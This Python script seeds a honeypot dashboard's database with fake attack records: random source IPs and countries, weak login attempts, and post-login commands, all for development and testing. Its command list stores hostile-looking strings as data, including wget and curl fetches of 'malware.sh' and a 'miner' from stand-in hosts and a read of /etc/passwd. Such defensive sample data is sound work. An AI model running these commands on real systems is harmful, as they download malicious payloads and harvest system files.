#!/usr/bin/env python3
"""
Add Sample Data

Generates sample attack data for development and testing.
Useful when you don't have a live honeypot yet.
"""
import sys
import os
from datetime import datetime, timedelta
import random

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from backend.database.db_manager import DatabaseManager


def generate_sample_data(count: int = 50):
    """Generate sample attack data"""

    db = DatabaseManager()

    # Sample data pools
    countries = [
        ('China', 'CN', 39.9, 116.4, 'Beijing'),
        ('Russia', 'RU', 55.7, 37.6, 'Moscow'),
        ('United States', 'US', 38.9, -77.0, 'Washington'),
        ('Brazil', 'BR', -15.8, -47.9, 'Brasilia'),
        ('India', 'IN', 28.6, 77.2, 'New Delhi'),
        ('Vietnam', 'VN', 21.0, 105.8, 'Hanoi'),
        ('Ukraine', 'UA', 50.4, 30.5, 'Kyiv'),
        ('Germany', 'DE', 52.5, 13.4, 'Berlin'),
        ('Netherlands', 'NL', 52.3, 4.9, 'Amsterdam'),
        ('France', 'FR', 48.8, 2.3, 'Paris'),
    ]

    usernames = ['root', 'admin', 'user', 'test', 'ubuntu', 'pi', 'oracle', 'postgres', 'mysql']
    passwords = ['password', '123456', 'admin', 'root', '12345678', 'qwerty', 'abc123', '111111']

    commands = [
        'whoami',
        'uname -a',
        'ls -la',
        'cat /etc/passwd',
        'cat /proc/cpuinfo',
        'wget http://example.com/malware.sh',
        'curl http://evil.com/miner',
        'chmod +x /tmp/run.sh',
        'ps aux',
        'netstat -ant',
        'ifconfig',
        'df -h',
    ]

    command_categories = {
        'whoami': 'reconnaissance',
        'uname -a': 'reconnaissance',
        'ls -la': 'reconnaissance',
        'cat /etc/passwd': 'reconnaissance',
        'cat /proc/cpuinfo': 'reconnaissance',
        'wget http://example.com/malware.sh': 'download',
        'curl http://evil.com/miner': 'download',
        'chmod +x /tmp/run.sh': 'execution',
        'ps aux': 'reconnaissance',
        'netstat -ant': 'reconnaissance',
        'ifconfig': 'reconnaissance',
        'df -h': 'reconnaissance',
    }

    print("=" * 60)
    print("Generating Sample Attack Data")
    print("=" * 60)
    print(f"Creating {count} sample attacks...\n")

    for i in range(count):
        # Random country
        country, cc, base_lat, base_lng, city = random.choice(countries)

        # Random IP address
        src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

        # Random timestamp within last 30 days
        days_ago = random.randint(0, 30)
        hours_ago = random.randint(0, 23)
        timestamp = datetime.utcnow() - timedelta(days=days_ago, hours=hours_ago)

        # Create attack
        attack_data = {
            'timestamp': timestamp,
            'src_ip': src_ip,
            'src_port': random.randint(40000, 60000),
            'dst_port': 2222,
            'session_id': f"sample_session_{i:04d}",
            'country': country,
            'country_code': cc,
            'city': city,
            'latitude': base_lat + random.uniform(-5, 5),
            'longitude': base_lng + random.uniform(-5, 5),
            'isp': f"Sample ISP {random.randint(1, 10)}",
        }

        attack = db.add_attack(attack_data)

        if not attack:
            print(f"✗ Failed to create attack {i+1}")
            continue

        # Add login attempts (1-8 per attack)
        login_count = random.randint(1, 8)
        successful = False

        for j in range(login_count):
            success = (j == login_count - 1) and random.random() > 0.7  # 30% success rate
            if success:
                successful = True

            db.add_login_attempt({
                'attack_id': attack.id,
                'username': random.choice(usernames),
                'password': random.choice(passwords),
                'success': success,
                'timestamp': timestamp + timedelta(seconds=j*2),
            })

        # If login was successful, add commands
        if successful and random.random() > 0.3:
            cmd_count = random.randint(1, 5)
            selected_commands = random.sample(commands, min(cmd_count, len(commands)))

            for j, cmd in enumerate(selected_commands):
                db.add_command({
                    'attack_id': attack.id,
                    'command': cmd,
                    'category': command_categories.get(cmd, 'unknown'),
                    'timestamp': timestamp + timedelta(seconds=(login_count*2) + j*5),
                    'success': True,
                })

        # Progress indicator
        if (i + 1) % 10 == 0:
            print(f"  Created {i + 1}/{count} attacks...")

    print(f"\n✓ Successfully created {count} sample attacks!")
    print("\nSummary:")

    # Show stats
    stats = db.get_attack_stats()
    print(f"  Total attacks: {stats['total_attacks']}")
    print(f"  Unique IPs: {stats['unique_ips']}")
    print(f"  Countries: {stats['unique_countries']}")
    print(f"  Top country: {stats['top_country']} ({stats['top_country_count']} attacks)")

    print("\n" + "=" * 60)
    print("Sample data generation complete!")
    print("Start the dashboard to view: python dashboard/app.py")
    print("=" * 60)


def main():
    """Main entry point"""
    import argparse

    parser = argparse.ArgumentParser(description='Generate sample attack data')
    parser.add_argument(
        '--count',
        type=int,
        default=50,
        help='Number of sample attacks to generate (default: 50)'
    )

    args = parser.parse_args()

    try:
        generate_sample_data(args.count)
    except Exception as e:
        print(f"\n✗ Error: {e}")
        sys.exit(1)


if __name__ == '__main__':
    main()
